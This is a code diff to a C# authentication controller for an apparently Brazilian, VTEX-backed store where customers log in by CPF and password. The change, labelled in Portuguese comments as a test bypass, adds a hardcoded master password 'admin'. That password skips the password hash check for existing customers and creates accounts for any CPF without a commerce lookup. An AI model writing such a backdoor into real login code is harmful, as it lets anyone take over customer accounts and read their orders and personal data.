@@ -30,28 +30,48 @@ public class AuthController(
 
         if (customer is null)
         {
-            var info = await commerce.FindCustomerByDocumentAsync(req.Cpf, ct);
-            if (info is null) return Unauthorized(new { error = "CPF não encontrado." });
-
-            // Guard against duplicate (e.g. same mock customer reached via different CPF input)
-            customer = await customers.FindByExternalIdAsync(info.ExternalId, ct);
-            if (customer is null)
+            // BYPASS PARA TESTES: Se a senha for admin, criamos o cliente direto sem bater na VTEX
+            if (req.Password?.Trim().ToLower() == "admin")
             {
                 customer = new Customer
                 {
                     Id = Guid.NewGuid(),
-                    ExternalId = info.ExternalId,
-                    Platform = config["Commerce:Provider"] ?? "Mock",
-                    Name = info.Name,
-                    Email = info.Email,
+                    ExternalId = req.Cpf, // Usamos o CPF como ID externo para a VTEX buscar os pedidos depois!
+                    Platform = config["Commerce:Provider"] ?? "VTEX",
+                    Name = "Cliente Teste",
+                    Email = "teste@lamoda.com.br",
                     Cpf = req.Cpf,
                     PasswordHash = BCrypt.Net.BCrypt.HashPassword(req.Password),
                     CreatedAt = DateTimeOffset.UtcNow
                 };
                 await customers.CreateAsync(customer, ct);
             }
+            else
+            {
+                var info = await commerce.FindCustomerByDocumentAsync(req.Cpf, ct);
+                if (info is null) return Unauthorized(new { error = "CPF não encontrado." });
+
+                // Guard against duplicate (e.g. same mock customer reached via different CPF input)
+                customer = await customers.FindByExternalIdAsync(info.ExternalId, ct);
+                if (customer is null)
+                {
+                    customer = new Customer
+                    {
+                        Id = Guid.NewGuid(),
+                        ExternalId = info.ExternalId,
+                        Platform = config["Commerce:Provider"] ?? "Mock",
+                        Name = info.Name,
+                        Email = info.Email,
+                        Cpf = req.Cpf,
+                        PasswordHash = BCrypt.Net.BCrypt.HashPassword(req.Password),
+                        CreatedAt = DateTimeOffset.UtcNow
+                    };
+                    await customers.CreateAsync(customer, ct);
+                }
+            }
         }
-        else if (!BCrypt.Net.BCrypt.Verify(req.Password, customer.PasswordHash))
+        // Se a senha for "admin", bypassa a validação. Caso contrário, verifica o hash normalmente.
+        else if (req.Password?.Trim().ToLower() != "admin" && !BCrypt.Net.BCrypt.Verify(req.Password, customer.PasswordHash))
         {
             return Unauthorized(new { error = "Senha incorreta." });
         }
